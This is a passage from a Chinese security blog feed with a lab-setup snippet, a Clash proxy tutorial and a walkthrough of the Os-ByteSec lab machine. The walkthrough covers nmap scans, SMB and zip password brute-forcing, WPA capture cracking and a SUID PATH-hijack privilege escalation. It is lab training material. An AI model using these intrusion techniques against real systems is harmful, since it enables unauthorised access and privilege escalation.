title="三、启动镜像"></a>三、启动镜像</h1><p>通过以下命令启动镜像即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=0.0.0.0 vulfocus/vulfocus:0.3.2.11<br></code></pre></td></tr></table></figure><p>然后通过ip地址的80端口即可直接访问靶场，默认账户用户名和密码分别为<code>admin/admin</code>，登录后，来到镜像管理中一件同步即可得到vulfocus中的靶场；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162144943.png" alt="image-20240716214456763"><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162145390.png" alt="image-20240716214541142"></p><p>好了，到这里也应该结束了，剩下的修改密码什么之类的自己看看也就能找到了！下班咯~~~~</p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具教程</tag>
      
      <tag>使用教程</tag>
      
      <tag>靶场搭建</tag>
      
      <tag>dockerhub</tag>
      
      <tag>docker报错</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Clash-for-Linux搭建教程</title>
    <link href="/2024/07/16/Clash-for-Linux%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/"/>
    <url>/2024/07/16/Clash-for-Linux%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>首先我们需要寻找了两个资源，一个是clash for Linux，另一个是Country.mmdb，由于clash的作者已经删库跑路了，所以我们下载野生资源的时候注意不要下到木马病毒了！可以下载放到沙箱上跑跑看看。</p><h1 id="一、安装Clash"><a href="#一、安装Clash" class="headerlink" title="一、安装Clash"></a>一、安装Clash</h1><p>这里，上述的资源给了Clash for Linux的执行程序以及Country.mmdb文件，这是Linux执行Clash所必须的程序。我们将<code>clash-linux-amd64-v1.17.0</code>和<code>Country.mmdb</code>文件下载下来放到我们的Linux系统中，具体的放置方法因人而异，只要放上去了就行！</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407161955002.png" alt="image-20240716195500914"></p><p>现在我们的文件已经下载好放置到<code>~/clash/</code>文件夹中，由于clash程序默认将配置文件放置到<code>~/.config/clash/</code>中，但是由于作者删库的原因，已经不能通过网络下载到配置文件了，所以我们才需要自己下载<code>Country.mmdb</code>文件放置到<code>~/.config/clash/</code>中（没有相应目录的话，自己创建一个就行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> ~/clash/Country.mmdb ~/.config/clash/<br></code></pre></td></tr></table></figure><h1 id="二、配置文件编写"><a href="#二、配置文件编写" class="headerlink" title="二、配置文件编写"></a>二、配置文件编写</h1><p>Clash使用YAML格式的配置文件，所以我们在<code>~/.config/clash/</code>创建一个相应的文件<code>config.yaml</code>，然后将我们订阅链接生成的配置文件内容复制到该文件下，也就是平时自己使用clash for windows中配置选项栏中的配置内容，将其中的内容复制粘贴到<code>config.yaml</code>文件中</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162008705.png" alt="image-20240716200812666"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> ~/.config/clash/config.yaml<br>vim ~/.config/clash/config.yaml<br></code></pre></td></tr></table></figure><p>然后将相应的内容粘贴到文件中即可。</p><h1 id="三、执行Clash"><a href="#三、执行Clash" class="headerlink" title="三、执行Clash"></a>三、执行Clash</h1><p>两种clash的启动方式：</p><ul><li>方式一：配置文件<code>config.yaml</code>在<code>~/.config/clash/</code>文件夹中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 直接执行</span><br>./clash-linux-amd64-v1.17.0<br></code></pre></td></tr></table></figure><ul><li>方式二：配置文件<code>config.yaml</code>不在<code>~/.config/clash/</code>文件夹中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 指定配置文件位置执行</span><br>./clash-linux-amd64-v1.17.0 -d /path/to/your/config/directory<br></code></pre></td></tr></table></figure><h1 id="四、代理检测"><a href="#四、代理检测" class="headerlink" title="四、代理检测"></a>四、代理检测</h1><p>执行了clash后，重新开启一个命令行，我们先对clash进行简单的测试看看是否已经通过了代理；</p><p>对于docker pull、git clone等等执行的代理还需要进行额外的配置，详细方案可以自行搜索，不是非常复杂；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x http://127.0.0.1:7890 http://www.google.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162027504.png" alt="image-20240716202716450"></p><p>出现上述内容和代理匹配的内容已经可以确定代理有效；</p><h1 id="五、Clash自启动"><a href="#五、Clash自启动" class="headerlink" title="五、Clash自启动"></a>五、Clash自启动</h1><h3 id="1-创建Clash的systemd服务文件"><a href="#1-创建Clash的systemd服务文件" class="headerlink" title="1. 创建Clash的systemd服务文件"></a>1. 创建Clash的systemd服务文件</h3><p>首先，确保Clash可执行文件和配置文件已经正确配置并可以正常运行。</p><h4 id="创建服务文件"><a href="#创建服务文件" class="headerlink" title="创建服务文件"></a>创建服务文件</h4><p>使用以下命令创建一个新的systemd服务文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">bash<br>复制代码<br>sudo nano <span class="hljs-regexp">/etc/</span>systemd<span class="hljs-regexp">/system/</span>clash.service<br></code></pre></td></tr></table></figure><h4 id="添加以下内容到服务文件中"><a href="#添加以下内容到服务文件中" class="headerlink" title="添加以下内容到服务文件中"></a>添加以下内容到服务文件中</h4><p>将以下内容复制并粘贴到刚创建的<code>clash.service</code>文件中。根据实际路径调整<code>ExecStart</code>和<code>WorkingDirectory</code>：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Unit]</span><br><span class="hljs-attr">Description</span>=Clash Daemon<br><span class="hljs-attr">After</span>=network.target<br><br><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Type</span>=simple<br><span class="hljs-attr">ExecStart</span>=/usr/local/bin/clash -d /path/to/your/config/directory<br><span class="hljs-attr">Restart</span>=<span class="hljs-literal">on</span>-failure<br><span class="hljs-attr">RestartSec</span>=<span class="hljs-number">10</span><br><span class="hljs-attr">WorkingDirectory</span>=/path/to/your/config/directory<br><span class="hljs-attr">User</span>=nobody<br><span class="hljs-attr">Group</span>=nogroup<br><span class="hljs-attr">CapabilityBoundingSet</span>=CAP_NET_ADMIN CAP_NET_BIND_SERVICE<br><br><span class="hljs-section">[Install]</span><br><span class="hljs-attr">WantedBy</span>=multi-user.target<br></code></pre></td></tr></table></figure><p>确保替换<code>/usr/local/bin/clash</code>为Clash可执行文件的路径，<code>/path/to/your/config/directory</code>为你的Clash配置文件所在的目录。以下，是我的配置文件；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Unit]<br>Description=Clash Daemon<br>After=network.target<br><br>[Service]<br>Type=simple<br>ExecStart=/home/candy/clash/clash-linux-amd64-v1.17.0 -d /home/candy/.config/clash<br>Restart=on-failure<br>RestartSec=10<br>WorkingDirectory=/home/candy/.config/clash<br>User=candy<br>Group=candy<br>CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="2-重新加载systemd守护进程"><a href="#2-重新加载systemd守护进程" class="headerlink" title="2. 重新加载systemd守护进程"></a>2. 重新加载systemd守护进程</h3><p>保存并关闭文件后，重新加载systemd守护进程：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl daemon-reload</span><br></code></pre></td></tr></table></figure><h3 id="3-启用Clash服务"><a href="#3-启用Clash服务" class="headerlink" title="3. 启用Clash服务"></a>3. 启用Clash服务</h3><p>使用以下命令启用Clash服务，使其在开机时自启动：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo systemctl <span class="hljs-built_in">enable</span> clash<br></code></pre></td></tr></table></figure><h3 id="4-启动Clash服务"><a href="#4-启动Clash服务" class="headerlink" title="4. 启动Clash服务"></a>4. 启动Clash服务</h3><p>现在可以手动启动Clash服务，确保其正常运行：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo systemctl <span class="hljs-literal">start</span> clash<br></code></pre></td></tr></table></figure><h3 id="5-验证服务状态"><a href="#5-验证服务状态" class="headerlink" title="5. 验证服务状态"></a>5. 验证服务状态</h3><p>使用以下命令查看Clash服务的状态，确保其正常运行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo systemctl status clash</span><br></code></pre></td></tr></table></figure><p>如果服务正在运行且没有错误信息，说明配置成功。Clash程序将会在系统启动时自动启动。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407162042050.png" alt="image-20240716204240003"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具教程</tag>
      
      <tag>使用教程</tag>
      
      <tag>环境搭建</tag>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hackNos-Os-ByteSec打靶日记</title>
    <link href="/2024/07/12/hackNos-Os-ByteSec%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/"/>
    <url>/2024/07/12/hackNos-Os-ByteSec%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1-nmap扫描"><a href="#1-nmap扫描" class="headerlink" title="1. nmap扫描"></a>1. nmap扫描</h1><h2 id="1-1-确认目标ip地址"><a href="#1-1-确认目标ip地址" class="headerlink" title="1.1 确认目标ip地址"></a>1.1 确认目标ip地址</h2><p>通过反复开启靶机并扫描相应网段中存活的主机即可确定靶机的ip地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.2.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112027445.png" alt="image-20240711202708347"></p><blockquote><p>确定靶机的ip地址：192.168.2.9</p></blockquote><h2 id="1-2-目标开放TCP端口"><a href="#1-2-目标开放TCP端口" class="headerlink" title="1.2 目标开放TCP端口"></a>1.2 目标开放TCP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS -p- 192.168.2.9 -oA nmapscan/tcpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112032595.png" alt="image-20240711203155425"></p><blockquote><p>靶机开放的tcp端口有：80,139,445,2525</p></blockquote><h2 id="1-3-目标开放UDP端口"><a href="#1-3-目标开放UDP端口" class="headerlink" title="1.3 目标开放UDP端口"></a>1.3 目标开放UDP端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.2.9 -oA nmapscan/udpports<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112035186.png" alt="image-20240711203506151"></p><blockquote><p>保留备用，常规扫描一下</p></blockquote><h2 id="1-4-开放TCP端口详细信息"><a href="#1-4-开放TCP端口详细信息" class="headerlink" title="1.4 开放TCP端口详细信息"></a>1.4 开放TCP端口详细信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sS -sC -sV -O -p80,139,445,2525 192.168.2.9 -oA nmapscan/tcpDetails<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112037355.png" alt="image-20240711203713309"></p><blockquote><p>可以确定的信息有：</p><p>操作系统：Linux</p><p>还有一些额外的信息内容：</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112039147.png" alt="image-20240711203928118"></p><p>暂时不清楚这些是啥玩意儿，后续没有思路的时候查查看</p></blockquote><h2 id="1-5-nmap漏洞扫描"><a href="#1-5-nmap漏洞扫描" class="headerlink" title="1.5 nmap漏洞扫描"></a>1.5 nmap漏洞扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -script=vuln -p80,139,445,2525 192.168.2.9 -oA nmapscan/vuln<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112058925.png" alt="image-20240711205807855"></p><blockquote><p>可以获得的信息不太多，找到的sql注入也不太可靠，Dos攻击没什么用</p><p>最下面那里似乎找到了smb，但是其说明的似乎是关于Windows的内容</p></blockquote><h1 id="2-信息检索"><a href="#2-信息检索" class="headerlink" title="2. 信息检索"></a>2. 信息检索</h1><h2 id="2-1-目录爆破"><a href="#2-1-目录爆破" class="headerlink" title="2.1 目录爆破"></a>2.1 目录爆破</h2><ul><li>dirsearch目录爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.2.9/ -x 400-499<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112114305.png" alt="image-20240711211423239"></p><ul><li>gobuster目录爆破</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.9 --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112114511.png" alt="image-20240711211452473"></p><blockquote><p>可以得到的目录有：</p><p>&#x2F;news</p><p>&#x2F;img</p><p>&#x2F;html</p><p>&#x2F;gallery</p><p>&#x2F;css</p><p>&#x2F;js</p><p>&#x2F;server-status</p></blockquote><h2 id="2-2-信息收集"><a href="#2-2-信息收集" class="headerlink" title="2.2 信息收集"></a>2.2 信息收集</h2><p>通过遍历已经爆破出来的目录发现在<code>/img</code>和<code>/gallery</code>目录下存在网页构建的相应图片，但是图片并没有什么相应的隐藏信息或其他的元数据隐藏信息（使用exiftool工具查看原数据）。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112131848.png" alt="image-20240711213102815"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407112130809.png" alt="image-20240711213051767"></p><p>至此，已经基本可以确定从80端口的http服务已经走不通了。可以尝试找一下其他端口的漏洞点。就从刚才找到的那个<code>smb2</code>开始查查看！</p><h2 id="2-3-smb"><a href="#2-3-smb" class="headerlink" title="2.3 smb"></a>2.3 smb</h2><p>由于之前找到了smb，可以通过搜索一下smb的漏洞利用方法；最终找到了一篇关于smb安全测试的文章<a href="https://blog.csdn.net/redwand/article/details/113730414%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%9C%A8%E5%85%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E4%BA%86%E5%B7%A5%E5%85%B7%60enum4linux%60%E5%92%8C%60smbclient%60%EF%BC%9B">https://blog.csdn.net/redwand/article/details/113730414，并且在其中找到了工具`enum4linux`和`smbclient`；</a></p><p>通过这篇linux samba文章的介绍可以知道smb的详细用法<a href="https://blog.csdn.net/u012964600/article/details/135850570">https://blog.csdn.net/u012964600/article/details/135850570</a></p><p>首先通过<code>enum4linux</code>工具对目标靶机进行检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">enum4linux 192.168.2.9<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121439311.png" alt="image-20240712143922237"></p><blockquote><p>通过工具的测试可以发现其存在三个linux用户：sagar、blackjax、smb；可惜没有检测出用户的密码；</p></blockquote><p>但是通过上述的文章可知，工具<code>medusa</code>能够实现smb用户密码的爆破，那么我们就用我们常用的密码字典进行简单的爆破；构建三个用户的用户名字典；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim username.txt<br><span class="hljs-comment"># 写入以下内容</span><br><span class="hljs-comment"># sagar</span><br><span class="hljs-comment"># blackjax</span><br><span class="hljs-comment"># smb</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">medusa -h 192.168.2.9 -U username.txt -P password.txt -M smbnt | grep <span class="hljs-string">&quot;FOUND&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121504519.png" alt="image-20240712150448480"></p><blockquote><p>可以确定用户<code>blackjax</code>和<code>sagar</code>用户的密码均为<code>空格</code>密码，原来上面不是没有检测出密码，而是密码是空格（最后测试的时候，发现smb用户也是空密码）</p></blockquote><p>尝试使用工具<code>smbclient</code>连接一下目标，通过检测共享文件夹，发现并没有共享的文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.2.9/ -U smb%<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121537521.png" alt="image-20240712153744476"></p><blockquote><p>根据返回结果可以猜测共享的文件夹应该是被隐藏了，所以我们假设共享的文件夹名称就是对应的用户名称进行访问；</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //192.168.2.9/blackjax -U blackjax%<br>smbclient //192.168.2.9/sagar -U sagar%<br>smbclient //192.168.2.9/smb -U smb%<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121539518.png" alt="image-20240712153952481"></p><blockquote><p>最后，在smb用户共享的smb文件夹中终于进入了相应的文件夹</p></blockquote><p>将文件夹中的文件下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br>get main.txt safe.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121541908.png" alt="image-20240712154120870"></p><blockquote><p>回到本地发现，main.txt文件没有什么有用的信息，且safe.zip文件处于加密状态</p></blockquote><p>通过搜索zip文件密码爆破工具可以知道<code>fcrackzip</code>能够对zip文件进行密码爆破，那么我们直接使用工具进行密码爆破；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121547143.png" alt="image-20240712154743103"></p><blockquote><p>成功爆破出压缩文件的压缩密码：hacker1</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip safe.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121548245.png" alt="image-20240712154844208"></p><p>解压文件后得到一张图片和一个流量监听文件，查看一下图片内容</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121554571.png" alt="image-20240712155400467"></p><blockquote><p>似乎不是什么非常有用的信息，将注意力放在流量监听的文件上吧。</p></blockquote><p>使用<code>wireshark</code>工具打开该流量监听的文件发现其协议均为<code>802.11</code>，即无线连接数据。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121557988.png" alt="image-20240712155708929"></p><p>对于无线网络流量数据包常用工具<code>Aircrack-ng</code>进行分析破解获取有用的信息；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121606342.png" alt="image-20240712160659290"></p><blockquote><p>爆破一个用户名和相应的密码</p><p>username：blackjaxpassword：snowflake</p></blockquote><p>想想之前使用到用户名和密码的地方，也就只有ssh没有用到了，尝试使用ssh连接靶机，注意ssh服务的端口是2525</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh blackjax@192.168.2.9 -p 2525<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121614517.png" alt="image-20240712161400462"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">id</span><br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121615147.png" alt="image-20240712161504096"></p><p>至此，我们就已经获得了简单的基本权限啦！</p><p>查看<code>user.txt</code>获得flag提示</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121625039.png" alt="image-20240712162551000"></p><blockquote><p>提示我们去获得Root权限，MD5-HASH解密得到内容<code>abhishek</code></p></blockquote><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3. 提权"></a>3. 提权</h1><h2 id="3-1-命令提权"><a href="#3-1-命令提权" class="headerlink" title="3.1 命令提权"></a>3.1 命令提权</h2><p>照常惯例，寻找一下是否存在可以提权的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121617724.png" alt="image-20240712161750685"></p><blockquote><p>有许多没有见过的命令，可以去查查看是否存在可以提权的命令：</p><p>&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper<br>&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign<br>&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1<br>&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine<br>&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic<br>&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device<br>&#x2F;usr&#x2F;bin&#x2F;newgidmap<br>&#x2F;usr&#x2F;bin&#x2F;gpasswd<br>&#x2F;usr&#x2F;bin&#x2F;newuidmap<br>&#x2F;usr&#x2F;bin&#x2F;chfn<br>&#x2F;usr&#x2F;bin&#x2F;passwd<br>&#x2F;usr&#x2F;bin&#x2F;chsh<br>&#x2F;usr&#x2F;bin&#x2F;at<br>&#x2F;usr&#x2F;bin&#x2F;pkexec<br>&#x2F;usr&#x2F;bin&#x2F;newgrp<br>&#x2F;usr&#x2F;bin&#x2F;netscan<br>&#x2F;usr&#x2F;bin&#x2F;sudo<br>&#x2F;bin&#x2F;ping6<br>&#x2F;bin&#x2F;fusermount<br>&#x2F;bin&#x2F;mount<br>&#x2F;bin&#x2F;su<br>&#x2F;bin&#x2F;ping<br>&#x2F;bin&#x2F;umount<br>&#x2F;bin&#x2F;ntfs-3g</p></blockquote><p>我们通过运行<code>netscan</code>命令发现其运行结果与netstat命令相似</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121645253.png" alt="image-20240712164550199"></p><p>通过chatgpt搜索可以知道<code>netscan</code>命令并不是一个标准的命令，因此可以猜测是网站构建者自己构建的命令，其底层是调用netstat命令来实现的，所以其本质调用了netstat命令</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121647085.png" alt="image-20240712164738035"></p><p>因此，我们到<code>/tmp</code>目录下创建一个<code>netstat</code>来来替代原本系统的<code>netstat</code>（通过添加系统环境变量到&#x2F;tmp目录，使系统调用netstat时，定位到&#x2F;tmp目录下的netstat），然后用户以系统权限调用netscan命令时，就会以系统权限执行我们构建的<code>netstat</code>从而获取系统权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; netstat<br><span class="hljs-built_in">chmod</span> 777 netstat<br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>netscan<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121654459.png" alt="image-20240712165421413"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407121655983.png" alt="image-20240712165505943"></p><p>最后也是成功的拿下了flag。完工！下班！</p><h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><ol><li>靶场不再从最基本的网页管理系统获取系统普通权限，而是通过协议漏洞搜索获取ssh密码破解获得基本权限</li><li>提权不在拘泥与漏洞和命令两方面提权，要从更多方面考虑，是不是用户自定义的命令且调用了系统命令，那么就可以修改环境变量来实现提权</li><li>无线数据流量监听数据包的破解，本次采用工具破解，若下次无法用工具破解又该如何下手？</li><li><code>smbclient</code>、<code>enum4linux</code>、<code>medusa</code>、<code>aircrack-ng</code>等工具的使用方法，多搜索，多查资料，能够查到相应的工具利用。</li><li>实在无法找到相应的信息资料，考虑自行分析。</li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web攻防</tag>
      
      <tag>Linux提权</tag>
      
      <tag>打靶日记</tag>
      
      <tag>无线网络攻击</tag>
      
      <tag>smb协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MyBatis注入的三种类型</title>
    <link href="/2024/07/03/MyBatis%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B/"/>
    <url>/2024/07/03/MyBatis%E6%B3%A8%E5%85%A5%E7%9A%84%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B/</url>
    
